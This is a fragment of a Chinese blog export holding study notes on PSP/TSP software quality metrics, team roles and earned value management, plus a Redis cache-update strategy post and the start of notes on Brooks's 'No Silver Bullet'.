<h4 id="团队动力学：麦克勒格的X、Y-理论"><a href="#团队动力学：麦克勒格的X、Y-理论" class="headerlink" title="团队动力学：麦克勒格的X、Y-理论"></a>团队动力学：麦克勒格的X、Y-理论</h4><ol>
<li>X－理论：⼈性本恶，独裁式的管理⻛格，⽤⻢斯洛的底层需求（⽣理和安全）进⾏激励</li>
<li>Y - 理论：⼈性本善，⺠主式的管理⻛格，⽤⻢斯洛的⾼层需求（⾃尊和⾃我实现）进⾏激励</li>
</ol>
<h4 id="团队动力学：期望理论"><a href="#团队动力学：期望理论" class="headerlink" title="团队动力学：期望理论"></a>团队动力学：期望理论</h4><ol>
<li>M &#x3D; V * E</li>
<li>相信他们的努⼒很可能会产⽣成功的结果（V）</li>
<li>相信⾃⼰因为成功⽽得到相应的回报（E）</li>
</ol>
<h3 id="估算"><a href="#估算" class="headerlink" title="估算"></a>估算</h3><h4 id="项目规模估算：估算要点"><a href="#项目规模估算：估算要点" class="headerlink" title="项目规模估算：估算要点"></a>项目规模估算：估算要点</h4><ol>
<li>尽可能详细划分一点</li>
<li>建立对结果的信心</li>
<li>依赖数据</li>
<li>估算要的是过程，而非结果；估算的过程是相关干系人达成一致共识的过程</li>
</ol>
<h4 id="通用计划框架"><a href="#通用计划框架" class="headerlink" title="通用计划框架"></a>通用计划框架</h4><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20240103155049343.png" alt="image-20240103155049343" style="zoom:67%;" />

<h4 id="项目规模估算：PROBE方法"><a href="#项目规模估算：PROBE方法" class="headerlink" title="项目规模估算：PROBE方法"></a>项目规模估算：PROBE方法</h4><ol>
<li>设置合理的代理作为精确度量和早期规划需要的度量之间的桥梁：相对大小矩阵</li>
<li>相对大小而非绝对大小</li>
</ol>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20240103134450706.png" alt="image-20240103134450706" style="zoom:67%;" />



<h3 id="PSP质量管理"><a href="#PSP质量管理" class="headerlink" title="PSP质量管理"></a>PSP质量管理</h3><h4 id="PSP质量管理：质量策略"><a href="#PSP质量管理：质量策略" class="headerlink" title="PSP质量管理：质量策略"></a>PSP质量管理：质量策略</h4><ol>
<li>首先确保基本没有缺陷，然后再考察其他的质量目标。</li>
<li>使用缺陷管理来代替质量管理</li>
<li>高质量的产品也就意味着组成软件产品的各个组件基本无缺陷</li>
<li>各个组件的高质量是通过高质量评审来实现的</li>
</ol>
<h4 id="PSP质量管理：质量路径-Quality-Journey"><a href="#PSP质量管理：质量路径-Quality-Journey" class="headerlink" title="PSP质量管理：质量路径 Quality Journey"></a>PSP质量管理：质量路径 Quality Journey</h4><ol>
<li>各种测试</li>
<li>进入测试之前的产物质量提升</li>
<li>评审过程度量和稳定</li>
<li>质量意识和主人翁态度</li>
<li>个人review的度量和稳定</li>
<li>诉诸设计</li>
<li>缺陷预防</li>
<li>用户质量关——其他质量属性</li>
</ol>
<h3 id="PSP质量控制指标"><a href="#PSP质量控制指标" class="headerlink" title="PSP质量控制指标"></a>PSP质量控制指标</h3><h4 id="PSP质量控制指标：Yield"><a href="#PSP质量控制指标：Yield" class="headerlink" title="PSP质量控制指标：Yield"></a>PSP质量控制指标：Yield</h4><ol>
<li><p>Phase Yield &#x3D; 100 * 某阶段发现的缺陷个数 &#x2F; （ 某阶段注入的缺陷个数 + 进入该阶段前遗留的缺陷个数）</p>
</li>
<li><p>Process Yield &#x3D; 100 * 第一次编译前发现的缺陷个数 &#x2F; 第一次编译前注入的缺陷个数</p>
</li>
<li><p>Yield 可用于制定质量计划并且在项目执行阶段用于进行风险监控、预测、识别以及控制；</p>
</li>
<li><p>Yield 的计算是一种事后的质量控制手段，而且除非发现了所有的缺陷，否则很难非常精确地进行计算；也就是Yield 是估计度量，不可能精确度量；</p>
<p><strong><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20240102160151666.png" alt="image-20240102160151666" style="zoom:67%;" /></strong></p>
</li>
<li><p>上图第一个消除步骤是需求评审，第二个消除步骤是设计评审，第三个消除步骤是测试评审；</p>
</li>
</ol>
<h4 id="PSP质量控制指标：A-FR"><a href="#PSP质量控制指标：A-FR" class="headerlink" title="PSP质量控制指标：A&#x2F;FR"></a>PSP质量控制指标：A&#x2F;FR</h4><ol>
<li>A&#x2F;FR &#x3D; PSP质检成本 &#x2F; PSP失效成本，</li>
<li>质检成本 &#x3D; 设计评审时间 + 代码评审时间，</li>
<li>失效成本 &#x3D; 编译时间 + 单元测试时间；</li>
<li>理论上，A&#x2F;FR 值越大，意味着质量越高，但 A&#x2F;FR 值过大说明评审过多，则开发效率低下，因此 PSP 中 A&#x2F;FR 期望值为 2.0</li>
</ol>
<h4 id="PSP质量控制指标：PQI"><a href="#PSP质量控制指标：PQI" class="headerlink" title="PSP质量控制指标：PQI"></a>PSP质量控制指标：PQI</h4><ol>
<li><p>设计质量：设计时间应该大于编码时间，min(设计时间&#x2F;编码时间,1)</p>
</li>
<li><p>设计评审质量：设计评审的时间应该大于设计时间的 50%，min(2*设计评审时间&#x2F;设计时间,1)</p>
</li>
<li><p>代码评审质量：代码评审时间应该大于编码时间的 50%，min(2*代码评审时间&#x2F;编码时间,1)</p>
</li>
<li><p>代码质量：代码的编译缺陷密度应当小于 10 个&#x2F;千行，min(20&#x2F;(编译缺陷密度+10),1)</p>
</li>
<li><p>程序质量：代码的单元测试缺陷密度应当小于 5 个&#x2F;千行，min(10&#x2F;(单元测试缺陷密度+5),1)</p>
</li>
<li><p>PQI为以上五个质量乘积，0.4以上即可；</p>
</li>
<li><p>PQI 可以预测和度量，PQI 可以用作质量规划和过程改进；</p>
</li>
</ol>
<h4 id="PSP质量控制指标：Review-Rate"><a href="#PSP质量控制指标：Review-Rate" class="headerlink" title="PSP质量控制指标：Review Rate"></a>PSP质量控制指标：Review Rate</h4><ol>
<li>代码评审速度小于 200 LOC（代码行）&#x2F;h</li>
<li>文档评审速度小于 4 page（文档采用页）&#x2F;h</li>
</ol>
<h4 id="PSP质量控制指标：-DRL"><a href="#PSP质量控制指标：-DRL" class="headerlink" title="PSP质量控制指标： DRL"></a>PSP质量控制指标： DRL</h4><ol>
<li>BW以某个测试阶段（一般为单元测试）<strong>每小时发现的缺陷数</strong>为基础，其他阶段每小时发现缺陷数与该测试阶段每小时发现的缺陷的比值就是 DRL</li>
<li>DRL只能度量，不能预测</li>
</ol>
<h3 id="PSP设计模板"><a href="#PSP设计模板" class="headerlink" title="PSP设计模板"></a>PSP设计模板</h3><h4 id="PSP设计模板-1"><a href="#PSP设计模板-1" class="headerlink" title="PSP设计模板"></a>PSP设计模板</h4><ol>
<li>操作规格模板 OST：描述系统与外界的交互，用于场景描述：也就是”用户“与”待设计系统的正常情况和异常情况下的交互。</li>
<li>功能规格模式 FST：描述系统的对外接口，是一种静态信息的展现。</li>
<li>状态规格模式 SST：可以精确定义程序的所有状态、状态之间的转换以及伴随着每次状态转换的动作。</li>
<li>逻辑规格模式 LST：可以精确描述系统的内部静态逻辑。</li>
</ol>
<h4 id="PSP设计模板：与UML对比"><a href="#PSP设计模板：与UML对比" class="headerlink" title="PSP设计模板：与UML对比"></a>PSP设计模板：与UML对比</h4><ol>
<li><p>OST：UML用例图、时序图</p>
</li>
<li><p>FST：UML 类图，但方法的行为类图没有描述</p>
</li>
<li><p>SST：UML 状态图，但是 SST 中描述的关于状态、状态转换条件以及状态转换中的动作没有对应的 UML 图示方法。</p>
</li>
<li><p>LST：没有对应图</p>
</li>
<li><p>UML 中的时序图和类图所描述的类之间的关系以及对象之间的交互信息在4 个设计模板中没有对应的内容；</p>
</li>
</ol>
<h4 id="PSP设计模板：动静内外"><a href="#PSP设计模板：动静内外" class="headerlink" title="PSP设计模板：动静内外"></a>PSP设计模板：动静内外</h4><ol>
<li>外部动态：OST,FST</li>
<li>外部静态：FST</li>
<li>内部动态：SST</li>
<li>内部静态：LST</li>
</ol>
<h3 id="PSP设计验证"><a href="#PSP设计验证" class="headerlink" title="PSP设计验证"></a>PSP设计验证</h3><h4 id="PSP设计验证方法：状态机验证"><a href="#PSP设计验证方法：状态机验证" class="headerlink" title="PSP设计验证方法：状态机验证"></a>PSP设计验证方法：状态机验证</h4><ol>
<li><p>检查状态机，消除死循环和陷阱状态</p>
</li>
<li><p>检查状态转换，验证完整性和正交性</p>
</li>
<li><p>评价状态机，检验是否体现设计意图</p>
</li>
</ol>
<h4 id="PSP设计验证方法：符号化验证"><a href="#PSP设计验证方法：符号化验证" class="headerlink" title="PSP设计验证方法：符号化验证"></a>PSP设计验证方法：符号化验证</h4><ol>
<li>适合复杂的计算过程（？），不适合于有复杂逻辑的场合；</li>
<li>纯手工验证方法容易引入错误；</li>
<li>唯一一种提供全面设计验证的手段；</li>
</ol>
<h4 id="PSP设计验证方法：执行表验证"><a href="#PSP设计验证方法：执行表验证" class="headerlink" title="PSP设计验证方法：执行表验证"></a>PSP设计验证方法：执行表验证</h4><ol>
<li>可用于复杂逻辑的验证；</li>
<li>每次只能验证一个用例；手工验证比较耗时，容易引入错误。</li>
</ol>
<h4 id="PSP设计验证方法：跟踪表验证"><a href="#PSP设计验证方法：跟踪表验证" class="headerlink" title="PSP设计验证方法：跟踪表验证"></a>PSP设计验证方法：跟踪表验证</h4><ol>
<li>是执行表验证的补充，可以每次验证多个用例</li>
</ol>
<h4 id="PSP设计验证方法：正确性验证"><a href="#PSP设计验证方法：正确性验证" class="headerlink" title="PSP设计验证方法：正确性验证"></a>PSP设计验证方法：正确性验证</h4><h3 id="团队工程开发"><a href="#团队工程开发" class="headerlink" title="团队工程开发"></a>团队工程开发</h3><h4 id="需求分类"><a href="#需求分类" class="headerlink" title="需求分类"></a>需求分类</h4><ol>
<li>客户需求：描述的是客户的期望，是客户解决问题的愿望；</li>
<li>产品需求：描述的是开发团队所提供的解决方案。即针对上述的客户需求，开发团队设计出一个可以帮助客户解决工作当中碰到的问题的方案。</li>
<li>产品组件需求：描述的是组成产品的各个组件的需求规格。与产品需求相比，这是更低层次，更为细致的描述了上述解决方案中的某个组件的功能、性能与形式等。</li>
</ol>
<h4 id="需求开发的步骤"><a href="#需求开发的步骤" class="headerlink" title="需求开发的步骤"></a>需求开发的步骤</h4><ol>
<li>需求获取：采用”诱导“式方法获取客户的显式需求和隐式需求</li>
<li>需求汇总</li>
<li>需求验证</li>
<li>（需求文档制作）：需求开发工作完成的一个基本标志是形成了一份完整的、规范的、经过评审的需求规格说明书。</li>
</ol>
<h4 id="团队设计：设计标准"><a href="#团队设计：设计标准" class="headerlink" title="团队设计：设计标准"></a>团队设计：设计标准</h4><ol>
<li>命名规范</li>
<li>接口标准</li>
<li>系统出错信息</li>
<li>设计表示标准</li>
</ol>
<h4 id="团队设计：复用性支持"><a href="#团队设计：复用性支持" class="headerlink" title="团队设计：复用性支持"></a>团队设计：复用性支持</h4><ol>
<li>复用接口标准</li>
<li>复用文档标准</li>
<li>复用质量保证机制</li>
</ol>
<h4 id="集成策略选择：大爆炸集成策略"><a href="#集成策略选择：大爆炸集成策略" class="headerlink" title="集成策略选择：大爆炸集成策略"></a>集成策略选择：大爆炸集成策略</h4><ol>
<li>将所有已经完成的组件放在一起进行一次集成</li>
<li>优点：需要很少的测试用例</li>
<li>缺点：需要所有有待集成的组件质量非常高，否则会出现难以定位缺陷位置的问题，从而消耗很多测试时间；另外，系统越复杂，规模越大，问题越突出</li>
</ol>
<h4 id="集成策略选择：逐一添加集成策略"><a href="#集成策略选择：逐一添加集成策略" class="headerlink" title="集成策略选择：逐一添加集成策略"></a>集成策略选择：逐一添加集成策略</h4><ol>
<li>与大爆炸集成策略相反，采取一次添加一个组件的方式进行集成</li>
<li>优点：很容易定位缺陷位置，特别是在产品组件质量不高的情况下，每次集成之前都有着坚实的质量基础</li>
<li>缺点：需要测试用例非常多；存在有大量的回归测试，测试时间成本大</li>
</ol>
<h4 id="集成策略选择：集簇集成策略"><a href="#集成策略选择：集簇集成策略" class="headerlink" title="集成策略选择：集簇集成策略"></a>集成策略选择：集簇集成策略</h4><ol>
<li>是对逐一添加集成策略的改进，把有相似功能或者有关联的模块优先进行集成，形成可以工作的组件，然后以组件为单位继续较高层次的集成</li>
<li>优点：可以尽早获得一些可以工作的组件，有利于其它组件测试工作的开展</li>
<li>缺点：过于关注个别组件，而缺乏系统的整体观，不能尽早发现系统层面的缺陷</li>
</ol>
<h4 id="集成策略选择：扁平化集成策略"><a href="#集成策略选择：扁平化集成策略" class="headerlink" title="集成策略选择：扁平化集成策略"></a>集成策略选择：扁平化集成策略</h4><ol>
<li>优先集成高层的部件，然后逐步将各个组件、模块的真正实现加入系统。即尽快构建一个可以工作的扁平化系统</li>
<li>优点：可以尽早发现系统层面的缺陷</li>
<li>缺点：为了确保完成的系统，需要大量的打“桩”（stub），即提供一些直接提供返回值的伪实现。这种方式往往不能覆盖整个系统应该处理的多种状态</li>
</ol>
<h4 id="验证与确认-V-V"><a href="#验证与确认-V-V" class="headerlink" title="验证与确认 V &amp; V"></a>验证与确认 V &amp; V</h4><ol>
<li><p>验证（Verification)活动也是检验获得的产品和产品组件能不能满足各自事先定义好的需求规格；单元测试、集成、详细设计评审；</p>
</li>
<li><p>确认（Validation)活动是为了确保产品可以满足客户的需求以及实际操作场景的要求；验收测试、需求评审；</p>
</li>
</ol>
<h3 id="团队项目规划"><a href="#团队项目规划" class="headerlink" title="团队项目规划"></a>团队项目规划</h3><h4 id="工作分解结构-WBS-（Work-Breakdown-Structure）"><a href="#工作分解结构-WBS-（Work-Breakdown-Structure）" class="headerlink" title="工作分解结构 WBS （Work Breakdown Structure）"></a>工作分解结构 WBS （Work Breakdown Structure）</h4><ol>
<li>提供了项目范围基线，是范围变更的重要输入。</li>
<li>可以展现项目整体观，使得项目团队成员可以集中注意力实现项目的目标上。</li>
<li>为开发项目提供了一个整体框架，防止遗漏项目的可交付成果。</li>
<li>使得项目中各个角色的责任更明确，帮助项目团队的建立和获得项目成员的承诺。</li>
<li>为评估和分配任务提供具体的工作包的定义，工作包可以分配给项目某个成员或者另一个团队。</li>
<li>是进行估算和编制项目日程计划的基础。</li>
<li>可以帮助项目团队理解工作内容，分析项目的风险。</li>
</ol>
<h4 id="TSP九次会议"><a href="#TSP九次会议" class="headerlink" title="TSP九次会议"></a>TSP九次会议</h4><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20240102221907258.png" alt="image-20240102221907258" style="zoom:67%;" />

<h4 id="项目跟踪：挣值管理（EVM）"><a href="#项目跟踪：挣值管理（EVM）" class="headerlink" title="项目跟踪：挣值管理（EVM）"></a>项目跟踪：挣值管理（EVM）</h4><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20240102232458769.png" alt="image-20240102232458769" style="zoom:67%;" />

<ol>
<li>项目的挣值管理方法是用来<strong>客观度量项目进度的一种项目管理方法</strong></li>
<li>简单实现：这种方式仅仅关注进度信息。在实现时，首先需要建立WBS，定义工作范围；其次为WBS中每一项工作定义一个价值（PV）；最后按照一定的规则将某一数值赋给已经完成的工作或者正在进行的工作。常用规则分别为0-100规则和50-50规则，前者只有当某项任务完成时，该任务的PV值将转化成EV值；后者只需要开始某项任务，即可以赋原PV值的50%作为EV值，完成时，再加上另外的50%。而实际完成的工作所需成本AC不对EV值产生任何影响。</li>
<li>中级实现：在简单实现的基础上，加入日程偏差的计算。</li>
<li>高级实现：在中级实现的基础上，还需要考察项目的实际成本。</li>
<li>SV &#x3D; PV - EV; SPI &#x3D; EV&#x2F;PV; CV &#x3D; AC - EV; CPI &#x3D; EV&#x2F;AC;</li>
<li>预计完成成本EAC &#x3D; BAC &#x2F; CPI</li>
</ol>
<h4 id="挣值管理的局限性"><a href="#挣值管理的局限性" class="headerlink" title="挣值管理的局限性"></a>挣值管理的局限性</h4><ol>
<li>一般不能应用软件项目的质量管理。</li>
<li>需要定量化的管理机制，这就使得在一些探索型项目以及常用的敏捷开发方法中的应用受到限制。</li>
<li>完全依赖项目的准确估算，然而在项目早期，很难对项目进行非常准确的估算。</li>
</ol>
<h3 id="TSP经典角色"><a href="#TSP经典角色" class="headerlink" title="TSP经典角色"></a>TSP经典角色</h3><h4 id="TSP经典角色：总结"><a href="#TSP经典角色：总结" class="headerlink" title="TSP经典角色：总结"></a>TSP经典角色：总结</h4><ol>
<li>项目组长</li>
<li>计划经理：开发完整的、准确的团队计划和个人计划；每周准确的报告项目小组状态</li>
<li>开发经理：开发优秀的软件产品；充分利用团队成员的技能</li>
<li>质量经理：项目团队严格按照质量计划开展工作，开发出高质量的软件产品；所有的小组评审工作都正常开展，并且都形成了评审报告</li>
<li>过程经理：所有团队成员准确的记录、报告和跟踪过程数据；所有的团队会议都有相应会议记录。</li>
<li>支持经理：项目小组在整个开发过程中都有合适的工具和环境；对于基线产品，不存在非授权的变更；项目小组的风险和问题得到跟踪；项目小组在开发过程中满足复用目标</li>
<li>开发人员</li>
</ol>
<h4 id="TSP典型角色：项目组长"><a href="#TSP典型角色：项目组长" class="headerlink" title="TSP典型角色：项目组长"></a>TSP典型角色：项目组长</h4><ol>
<li><p>项目组长应当建设和维持高效率的团队。</p>
</li>
<li><p>项目组长应当激励团队成员积极工作。</p>
</li>
<li><p>项目组长应当合理处理团队成员的问题。</p>
</li>
<li><p>项目组长应当向管理层提供项目进度相关的完整信息。</p>
</li>
<li><p>项目组长应当充当合格的会议组织者和协调者。</p>
</li>
<li><p>你是天生的领导者</p>
</li>
<li><p>你有能力识别问题的关键并且做出客观的决策</p>
</li>
<li><p>你不介意偶尔充当“恶人”</p>
</li>
<li><p>你尊敬你的团队成员</p>
</li>
<li><p>激励团队成员努力工作</p>
</li>
<li><p>主持项目周例会</p>
</li>
<li><p>每周汇报项目状态</p>
</li>
<li><p>分配工作任务</p>
</li>
<li><p>维护项目资料</p>
</li>
<li><p>组织项目总结</p>
</li>
</ol>
<h4 id="TSP经典角色：计划经理"><a href="#TSP经典角色：计划经理" class="headerlink" title="TSP经典角色：计划经理"></a>TSP经典角色：计划经理</h4><ol>
<li><p>开发完整的、准确的团队计划和个人计划</p>
</li>
<li><p>每周准确的报告项目小组状态</p>
</li>
<li><p>最为重要的一点是，你做事有条理和逻辑</p>
</li>
<li><p>你对于过程数据非常感兴趣，期待通过每周输入的数据来了解项目当前状况</p>
</li>
<li><p>你认为计划非常重要，也愿意要求团队成员跟踪和度量他们的工作</p>
</li>
<li><p>带领项目小组开发项目计划</p>
</li>
<li><p>带领项目小组平衡计划</p>
</li>
<li><p>跟踪项目进度</p>
</li>
<li><p>参与项目总结</p>
</li>
</ol>
<h4 id="TSP经典角色：开发经理"><a href="#TSP经典角色：开发经理" class="headerlink" title="TSP经典角色：开发经理"></a>TSP经典角色：开发经理</h4><ol>
<li><p>开发优秀的软件产品</p>
</li>
<li><p>充分利用团队成员的技能</p>
</li>
<li><p>你喜欢创造事物</p>
</li>
<li><p>你愿意成为软件工程师，并且喜欢带领团队开展设计和开发工作</p>
</li>
<li><p>你具备足够的背景可以胜任设计师的工作，并且可以领导设计团队开展工作</p>
</li>
<li><p>你熟悉主流的设计工具</p>
</li>
<li><p>你愿意倾听和接受其他人的设计思想</p>
</li>
<li><p>带领团队制定开发策略。</p>
</li>
<li><p>带领团队开展产品规模估算和所需时间资源的估算。</p>
</li>
<li><p>带领团队开发需求规格说明。</p>
</li>
<li><p>带领团队开发高层设计。</p>
</li>
<li><p>带领团队开发设计规格说明。</p>
</li>
<li><p>带领团队实现软件产品。</p>
</li>
<li><p>带领团队开展集成测试和系统测试。</p>
</li>
<li><p>带领团队开发用户支持文档。</p>
</li>
<li><p>参与项目总结</p>
</li>
</ol>
<h4 id="TSP经典角色：质量经理"><a href="#TSP经典角色：质量经理" class="headerlink" title="TSP经典角色：质量经理"></a>TSP经典角色：质量经理</h4><ol>
<li><p>项目团队严格按照质量计划开展工作，开发出高质量的软件产品</p>
</li>
<li><p>所有的小组评审工作都正常开展，并且都形成了评审报告</p>
</li>
<li><p>你关注软件产品的质量</p>
</li>
<li><p>你有评审方面的经验，熟悉各种评审方法</p>
</li>
<li><p>你有协调组织有效评审的能力</p>
</li>
<li><p>带领团队开发和跟踪质量计划</p>
</li>
<li><p>向项目组长警示质量问题</p>
</li>
<li><p>软件产品提交配置管理之前，对其进行评审，以消除质量问题</p>
</li>
<li><p>项目小组评审的组织者和协调者</p>
</li>
<li><p>参与项目总结</p>
</li>
</ol>
<h4 id="TSP经典角色：过程经理"><a href="#TSP经典角色：过程经理" class="headerlink" title="TSP经典角色：过程经理"></a>TSP经典角色：过程经理</h4><ol>
<li><p>所有团队成员准确的记录、报告和跟踪过程数据。</p>
</li>
<li><p>所有的团队会议都有相应会议记录。</p>
</li>
<li><p>你对过程定义、过程度量非常感兴趣</p>
</li>
<li><p>你对过程改进非常感兴趣</p>
</li>
<li><p>带领团队定义和记录开发过程并且支持过程改进。</p>
</li>
<li><p>建立和维护团队的开发标准。</p>
</li>
<li><p>记录和维护项目的会议记录。</p>
</li>
<li><p>参与项目总结。</p>
</li>
</ol>
<h4 id="TSP经典角色：支持经理"><a href="#TSP经典角色：支持经理" class="headerlink" title="TSP经典角色：支持经理"></a>TSP经典角色：支持经理</h4><ol>
<li><p>项目小组在整个开发过程中都有合适的工具和环境</p>
</li>
<li><p>对于基线产品，不存在非授权的变更</p>
</li>
<li><p>项目小组的风险和问题得到跟踪</p>
</li>
<li><p>项目小组在开发过程中满足复用目标</p>
</li>
<li><p>你对于各种开发工具很感兴趣，熟悉各类工具的适用场合。</p>
</li>
<li><p>你对版本控制工具很熟悉，也熟悉配置管理流程。</p>
</li>
<li><p>对于本项目所有工具而言，你都是专家。</p>
</li>
<li><p>带领团队识别开发过程中所需要的各类工具和设施。</p>
</li>
<li><p>主持配置管理委员会，管理配置管理系统。</p>
</li>
<li><p>维护软件项目的词汇表。</p>
</li>
<li><p>维护项目风险和问题跟踪系统。</p>
</li>
<li><p>支持软件开发过程中复用策略的应用。</p>
</li>
<li><p>参与项目总结。</p>
</li>
</ol>
<h4 id="TSP经典角色：开发人员"><a href="#TSP经典角色：开发人员" class="headerlink" title="TSP经典角色：开发人员"></a>TSP经典角色：开发人员</h4>]]></content>
      <categories>
        <category>软件质量与管理</category>
      </categories>
      <tags>
        <tag>期末复习</tag>
        <tag>软件质量与管理</tag>
      </tags>
  </entry>
  <entry>
    <title>黑马点评项目实战（一）——缓存更新策略</title>
    <url>/2024/02/15/%E9%BB%91%E9%A9%AC%E7%82%B9%E8%AF%84%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89%E2%80%94%E2%80%94%E7%BC%93%E5%AD%98%E6%9B%B4%E6%96%B0%E7%AD%96%E7%95%A5/</url>
    <content><![CDATA[<h2 id="一-缓存更新策略"><a href="#一-缓存更新策略" class="headerlink" title="一 缓存更新策略"></a>一 缓存更新策略</h2><table>
<thead>
<tr>
<th></th>
<th>内存淘汰</th>
<th>超时剔除</th>
<th>主动更新</th>
</tr>
</thead>
<tbody><tr>
<td><strong>说明</strong></td>
<td>不用自己维护，利用Redis的内存淘汰机制，当内存不足时自动淘汰部分数据，当内存不足时自动淘汰部分数据。下次查询时更新缓存。</td>
<td>给缓存数据添加TTL时间，到期后自动删除缓存。下次查询时更新缓存。</td>
<td>编写业务逻辑，在修改数据库的同时，更新缓存。</td>
</tr>
<tr>
<td><strong>一致性</strong></td>
<td>差</td>
<td>一般</td>
<td>好</td>
</tr>
<tr>
<td><strong>维护成本</strong></td>
<td>无</td>
<td>低</td>
<td>高</td>
</tr>
</tbody></table>
<p>业务场景：</p>
<ul>
<li>低一致性需求：使用内存淘汰机制。例如店铺类型的缓存。</li>
<li>高一致性需求：主动更新， 并以超时剔除作为兜底方案。例如店铺详情的缓存。</li>
</ul>
<span id="more"></span>

<h2 id="二-主动更新策略"><a href="#二-主动更新策略" class="headerlink" title="二 主动更新策略"></a>二 主动更新策略</h2><table>
<thead>
<tr>
<th>Cache Aside Pattern</th>
<th>Read&#x2F;Write Through Pattern</th>
<th>Write Behind Caching Pattern</th>
</tr>
</thead>
<tbody><tr>
<td>由缓存的调用者，在更新数据库的同时更新缓存。</td>
<td>缓存与数据库整合为一个服务，由服务来维护一致性。调用者调用该服务，无需关心缓存一致性问题。</td>
<td>调用者只操作缓存，由其他线程异步的将缓存数据持久化到数据库，保证最终一致。</td>
</tr>
<tr>
<td>调用者需要写一些代码</td>
<td>维护一个这样的服务复杂，成本高</td>
<td>效率高，但维护异步服务难，可靠性和一致性较差</td>
</tr>
</tbody></table>
<h2 id="三-操作缓存和数据库"><a href="#三-操作缓存和数据库" class="headerlink" title="三 操作缓存和数据库"></a>三 操作缓存和数据库</h2><h3 id="1-删除缓存还是更新缓存？"><a href="#1-删除缓存还是更新缓存？" class="headerlink" title="1.删除缓存还是更新缓存？"></a>1.删除缓存还是更新缓存？</h3><p>更新缓存：每次更新数据库都更新缓存，无效写操作较多。</p>
<p>删除缓存：更新数据库时让缓存失效，查询时在更新缓存。√</p>
<h3 id="2-如何保证缓存与数据库的操作的同时成功或失败？"><a href="#2-如何保证缓存与数据库的操作的同时成功或失败？" class="headerlink" title="2.如何保证缓存与数据库的操作的同时成功或失败？"></a>2.如何保证缓存与数据库的操作的同时成功或失败？</h3><p><strong>保证原子性。</strong></p>
<p>单体系统：将缓存与数据库操作放在一个事务。</p>
<p>分布式系统：利用TCC等分布式事务方案。</p>
<h3 id="3-先操作缓存还是先操作数据库？（线程安全问题）"><a href="#3-先操作缓存还是先操作数据库？（线程安全问题）" class="headerlink" title="3.先操作缓存还是先操作数据库？（线程安全问题）"></a>3.先操作缓存还是先操作数据库？（线程安全问题）</h3><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250215150429038.png" alt="image-20250215150429038" style="zoom: 67%;" />

<p>由于更新数据库操作比较缓慢，而查询数据库和写入缓存操作很快，线程2很容易趁虚而入，因此该情况发生概率高。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250215150750330.png" alt="image-20250215150750330" style="zoom:67%;" />

<p>发生该情况需要满足：1.两个线程并行；2.缓存恰好失效；3.在线程1查询缓存和写入缓存两个操作的微秒级空隙内，线程2完成更新数据库和删除缓存操作。因此该情况发生的概率很低。</p>
<p>因此先操作数据库再删除缓存。</p>
<h2 id="四-缓存更新策略的最佳实践方案"><a href="#四-缓存更新策略的最佳实践方案" class="headerlink" title="四 缓存更新策略的最佳实践方案"></a>四 缓存更新策略的最佳实践方案</h2><ol>
<li>低一致性需求：使用Redis自带的内存淘汰机制</li>
<li>高一致性需求：主动更新， 并以超时剔除作为兜底方案<ul>
<li>读操作：<ul>
<li>缓存命中则直接返回</li>
<li>缓存未命中则查询数据库，并写入缓存，设定超时时间</li>
</ul>
</li>
<li>写操作<ul>
<li>先写数据库，然后再删除缓存</li>
<li>要确保数据库与缓存事务的原子性</li>
</ul>
</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>项目实战</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>redis</tag>
        <tag>黑马点评</tag>
      </tags>
  </entry>
  <entry>
    <title>软件工程管理2024 期末复习</title>
    <url>/2025/01/07/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E7%AE%A1%E7%90%86-%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="关于考试"><a href="#关于考试" class="headerlink" title="关于考试"></a>关于考试</h1><p>开卷考试，允许携带一张A4纸，可以展示大家的压缩字体能力和眼部放大镜能力了。</p>
<p>本章只是对本课所有课件的一个整理，同时还偷了一些来自参考的整理。</p>
<h1 id="没有银弹NoSilverBullet"><a href="#没有银弹NoSilverBullet" class="headerlink" title="没有银弹NoSilverBullet"></a>没有银弹NoSilverBullet</h1><p><strong>Author：Fredrick P. Brooks1986</strong></p>
<h2 id="主要思想"><a href="#主要思想" class="headerlink" title="主要思想"></a>主要思想</h2><ul>
<li>没有任何一种单纯的技术或管理上的进展，能够独立地承诺十年内使生产率、可靠性或简洁性获得数量级上的进步。</li>
<li>所有大家看到的技术、管理方法都不会给软件开发带来意想不到的效果。</li>
<li>软件开发在根本上就是困难的。</li>
</ul>
<span id="more"></span>

<h2 id="根本任务和次要任务"><a href="#根本任务和次要任务" class="headerlink" title="根本任务和次要任务"></a>根本任务和次要任务</h2><ul>
<li><p>根本任务(essential)——打造由抽象软件实体构成的复杂概念结构。</p>
</li>
<li><p>次要任务(accidental)——使用编程语言表达这些抽象实体，在空间和时间限制内将它们映射成机器语言。</p>
</li>
<li><p>除非次要任务占了所有工作的9&#x2F;10，否则即使全部次要任务的时间缩减到零，也不会给生产率带来数量级上的提高。</p>
</li>
</ul>
<h2 id="银弹"><a href="#银弹" class="headerlink" title="银弹"></a>银弹</h2><ul>
<li><p>人狼——可以完全出乎意料地从熟悉的面孔变成可怕的怪物。</p>
</li>
<li><p>消灭人狼——银弹。</p>
</li>
<li><p>软件项目——常常看似简单明了的东西，却有可能变成⼀个落后进度、超出预算、存在大量缺陷的怪物。</p>
</li>
</ul>
<h2 id="根本困难——软件特性中固有的困难"><a href="#根本困难——软件特性中固有的困难" class="headerlink" title="根本困难——软件特性中固有的困难"></a>根本困难——软件特性中固有的困难</h2><ul>
<li>我认为软件开发中困难的部分是规格化、设计和测试这些概念上的结构，而不是对概念进行表达和对实现逼真程度进行验证。</li>
<li>如果这是事实，那么软件开发总是非常困难的。天生就没有银弹。</li>
<li>现代软件系统中无法规避的内在特性：<strong>复杂度、一致性、可变性和不可见性</strong>。</li>
</ul>
